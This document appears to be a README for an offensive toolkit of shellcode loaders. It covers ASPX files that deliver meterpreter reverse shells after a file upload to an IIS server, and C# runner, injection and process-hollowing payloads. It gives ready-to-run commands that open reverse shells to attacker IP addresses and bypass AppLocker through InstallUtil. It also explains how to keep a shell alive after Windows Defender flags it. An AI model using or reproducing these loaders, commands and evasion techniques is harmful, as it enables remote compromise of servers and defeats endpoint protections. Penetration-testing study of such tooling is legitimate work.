# Loaders - Disk

Tools that aid in loading shellcode into memory, *from disk*, and executing.

## ToC

| Application | Output | Notes |
| ----------- | ------ | ----- |
| `ASPX_Inject64` | ASPX | ASPX Loader that injects 64-bit AES-Encrypted `meterpreter` shellcode into the loading process.  |
| `ASPX_Runner64` | ASPX | ASPX Loader that injects 64-bit AES-Encrypted `meterpreter` shellcode into a target process. |
| `D_invoke` | EXE | C# project that produces [D/invoke](https://github.com/TheWover/DInvoke) payloads |
| `clrunner` | EXE | C# project that has been modified to accept command line args for a reverse shell injected into the current process |
| `clinject` | EXE | C# project that has been modified to accept command line args for a reverse shell injected into a running process |
| `clhollow` | EXE | C# project that has been modified to accept command line args for a reverse shell hollowed into a new process |


## ASPX Loaders

These projects are meant to be used when you have arbitrary file upload on an IIS Server website. If you can upload `.aspx` files, you may use something like these files to get a reverse shell using meterpreter.

Both of these files draw inspiration from the `msfvenom -f aspx` payloads for the basic format. They're basically a `clinject` (ASPX_Inject64) or `clrunner` (ASPX_Runner64) payload wrapped in ASPX formatting.

I also highly recommend this read to understand how ASPX Files work: [codeproject - Behind the Scense of ASPX Files](https://www.codeproject.com/Articles/5897/Behind-the-scenes-of-ASPX-files).

Both require user configuration in the first lines of their respective `Page_Load` functions, as well as removal of any comments/HTML as desired. I left them there for educative purposes, since that is the point of these projects.

After configuring and uploading either of them, just visit the path where they are stored and the IIS server will compile and execute them for you! How nice :)
```sh
curl http://pwn.victim.com/ASPX_Inject64.aspx
```

Both were tested on the following Windows Defender setup:
```
AMEngineVersion                 : 1.1.17500.4
AMProductVersion                : 4.18.2009.7
AMRunningMode                   : Normal
AMServiceEnabled                : True
AMServiceVersion                : 4.18.2009.7
AntispywareEnabled              : True
AntispywareSignatureAge         : 1188
AntispywareSignatureLastUpdated : 10/12/2020 8:24:19 PM
AntispywareSignatureVersion     : 1.325.683.0
AntivirusEnabled                : True
AntivirusSignatureAge           : 1188
AntivirusSignatureLastUpdated   : 10/12/2020 8:24:21 PM
AntivirusSignatureVersion       : 1.325.683.0
BehaviorMonitorEnabled          : False
```

The Windows Defender setup shown above flags the temporary DLL that's created during the ASPX file's compilation as meterpreter. However, even if the DLL is deleted/quarantined, the process that the shell is living in isn't killed. So, you get to keep the shell!

### [ASPX_Inject64](./ASPX_Loaders/ASPX_Inject64.aspx)

Inject into the `TARGET_PROC` and return a `windows/x64/meterpreter/reverse_tcp` session to the listener at `RHOST:RPORT`. 

Keep in mind the process/user that is compiling and executing your payload. It *should be* an `IIS APPOOL` user (read up more on this group [on MS Docs](https://learn.microsoft.com/en-us/troubleshoot/developer/webapps/iis/www-authentication-authorization/default-permissions-user-rights)). These virtual accounts have as little permissions as possible.

That means that when looking for a process to inject into, it has to be a medium integrity or lower process. In a lot of servers, there just isn't many low-integrity processes that you can inject into. Then you have to think about any Exploit Protection settings that are in place.

The project picks the first PID returned from a process search using the provided name. You can update it so that it iterates through them until it finds one it can successfully inject into before continuing. I didn't feel like doing that here, but I did do it for the `powerinject` payload so you could draw inspiration from there.

If the payload isn't working and you don't know why, I recommend you start with the `ASPX_Runner64` payload. You can always just use meterpreter to migrate into another process, or elevate privs then use this.

OR you could use the `w3wp` process as your target, since you definitely have privileges for that.

### [ASPX_Runner64](./ASPX_Loaders/ASPX_Runner64.aspx)

Inject into the loading process (`w3wp`) and return a `windows/x64/meterpreter/reverse_tcp` session to the listener at `RHOST:RPORT`.

This project has different signatures and uses different APIs than the injection one, so its just good to have variety. 

There is one big difference from the `clrunner` project that this is based off of baked into this: this project uses the `Marshal.Copy` .NET API, which is heavily hooked by AVs. This increases its detection rate compared to the use of other random APIs like in `clrunner`. However, we can't use other APIs because we need to copy data from a managed array `e` to an unmanaged memory region `payAddr`. There are few APIs that can do that (tbh I didn't look too much into it), so I just used the `Copy` method.

The `RtlFillMemory` approach used in `clrunner` can't be used here because we can't cast `e` to a fixed memory region without the `fixed` keyword for the code block. We can't use that keyword, without specifying the `/unsafe` argument to the compiler. We can't add that argument to the compiler without controlling the web.config file. If we *can control the web.config file*, then we can use the approach shown in this [stackoverflow article](https://stackoverflow.com/questions/5867613/how-to-add-unsafe-keyword-in-web-based-asp-net-application-c-sharp).

I would say this project has a higher reliability than `ASPX_Inject64`, but its also much easier to detect. In the end they both rely on heavily signatured meterpreter shellcode so they both get flagged at runtime so whatever.


## [clrunner](./clrunner/clrunner.cs), [clinject](./clinject/clinject.cs) and [clhollow](./clhollow/clhollow.cs)

These are C# projects that have been modified in order to accept command line `Lhost`, `Lport`, and processes for targeting.  This allows a user to drop the payload on whatever target machine without worry of needing to re-roll shellcode if the attackers IP changes, or the payload needs to be pointed at a different machine in order to hit a tunnel and egress the network.

This was accomplished by using Msfvenom to create shellcode and then locating the IP and port that was specified in the msfvenom command within the output shellcode.  These bytes were replaced with unique identifier strings.  This process was accomplished with the [Port_ipeggs.py](./formatters/portip_eggs.py) script, which finds the hex bytes for the specified IP/PORT combo in a `msfvenom -f csharp` output file and replaces them with `0x11,0x11,0x11,0x11` and `0x22,0x22` respectively.  

This shellcode was then AES encrypted and placed in the C# project.  On run time, the shellcode is decrypted and then the IP and port given by the attacker is converted to hex and placed in the proper location wthin the decyrpted shellcode as marked by the unique identifer strings.

> TODO: Original author notes that `port_ipeggs.py` "Does not work with all payloads. Confirmed works with reverse_tcp, confirmed DOES NOT work with HTTPS". This could be why the HTTPs payloads in `/bins/` don't work. FIX.
> 
> Could also be related to the bug in the Meterpreter HTTPS payload a while back.

### clrunner Usage

C# project source code for (IP + Port) cli passed shellcode runner. Useful for when there are no processes that you can inject into or spoof PPIDs of (fairly often in initial access scenarios on servers). Use `multi/handler` with `windows/x64/meterpreter/reverse_tcp`.
> NOTE: The process you run it from will stall until you exit the shell, or kill the spawning process itself.
```bat
:: normal
clrunner.exe 192.168.1.198 53

:: installUtil AppLocker Bypass
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /rhost=192.168.45.241 /rport=53 /U C:\Users\Administrator\Desktop\clrunner.exe
```

### clinject Usage

C# project source code for (IP + port + process) cli passed process injection payload. Use `multi/handler` with `windows/x64/meterpreter/reverse_tcp`.
```bat
:: normal
clinject.exe 192.168.1.198 443 explorer

:: installUtil AppLocker Bypass
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /rhost=192.168.45.241 /rport=53 /process=explorer /U C:\Users\Administrator\Desktop\clinject.exe
```

### clhollow Usage

C# project source code for (IP + port + process + parent-process) cli passed process hollowing payload. Use `multi/handler` with `windows/x64/meterpreter/reverse_tcp`.
> NOTE: If the target hollow process is in the PATH environment variable, you can use the shorthand. e.g. `svchost` could replace the below path.
```bat
:: normal
clhollow.exe 192.168.1.198 443 c:\\windows\\system32\\svchost.exe explorer

:: installUtil AppLocker Bypass
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /rhost=192.168.45.241 /rport=53 /process=svchost /parent=explorer /U C:\Users\Administrator\Desktop\clhollow.exe
```

### Updates from OSEP-Tools Version
- Added `clrunner`
- Added InstallUtil uninstall bypass to all


## [D_invoke](./D_invoke/Builder/Program.cs)

C# project that produces D/invoke payloads (basic, injector, hollower + ppid spoof) in exe, dll, or service exe format.  Use pre-built builder.exe in the D_Invoke directory.

This is a package built using TheWover's project and research as the foundation (https://github.com/TheWover/DInvoke, https://thewover.github.io/Dynamic-Invoke/).

The inspiration for this project was to simplify the process of generating compiled C# payloads.  By using this project, a user never need open visual studio when creating payloads.

### General Usage Steps

1. Generate shellcode
    - This was built with msfvenom shellcode in c# as the primary input, however it was retooled to take .bin files during some testing with CobaltStrike
    - i.e. it takes C# & binary input
2. Format the shellcode for use with `Builder.exe` using the [formatshellcode.py](./formatters/formatshellcode.py) script (for msfvenom shellcode)
3. Transfer formatted shellcode to your Windows dev machine
4. Run builder.exe with the proper switches
5. Voila. You have your AES encryped shellcode D/invoke payload in whatever format and technique you want!

### Details 

The foundation of this package is `Builder.exe`.  This application allows the user to specify several options to include:

1. Format of payload (`/F:`)
    - EXE, DLL, OR Service EXE
2. Technique (`/T:`)
    - Local injection
    - Remote injection
    - Process hollowing with PPID spoofing
3. Shellcode file (`/S:`)
    - File containing parsed shellcode
4. Process name (`/P:`)
    - Process to corrupt for injection
        - Must be pretty name, e.g. `explorer`
    - Process to spawn for hollowing
        - Must be absolute path, e.g. `c:\\windows\\system32\\svchost.exe` (escape backslashes)
5. Parent Process (`/X:`)
    - Process for PPID spoofing with process hollowing technique
        - Must be pretty name, e.g. `explorer`
6. Architecture (`/A:`)
    - x86 OR x64

After the user specifies all the above options, a "`template.cs`" file within the selected format project (exe, dll, service) will be edited and the payload pieced together.  `Builder.exe` has hardcoded within it the necessary code for the various options (d/invoke statements for hollowing w/ ppid spoofing for example) that will be placed into the template file in the proper manner in the given format (exe, dll, service exe).

Builder will AES-256 encrypt the shellcode (*generating a new key and IV each time it is run*) and embed the encrypted shellcode within the template file. Once the template file is complete, it will be saved over `program.cs` in the respective format project.  MSBuild will then be called on the updated `program.cs` file in order to create the final payload in exe, dll, or service exe format.

### Limitations

The produced payloads use D/invoke statements for most, *but not all* of the API calls. Certain simple ones (As well as certain complex ones in the process hollowing payload) still use `p/invoke`. An `Installutil` bypass is baked into each *.exe* payload for use in case application whitelisting is in place.

Additionally, direct *syscalls* have not been implemented in this project. It is maybe a direction for further work. However given that certain EDR's don't even hook userland syscalls anymore, I haven't done this yet as I need to do more research on the correct direction to go in the future. 

Note that this tool was developed for personal use, not production.  As such there are some shortcomings in that there are hardcoded paths where `Builder.exe` expects to find things:
1. `Builder.exe` should only be run from within the d/invoke folder
    - i.e. `builder.exe` should be in the same folder as the dll, exe, and service folders as it is on the hosted repo
2. Additionally, MSBuild is hardcoded for VS2019
    - If you are utilizing a different version, you will need to edit the source code of `Builder.exe` and update it with the path to MSBuild within your version.
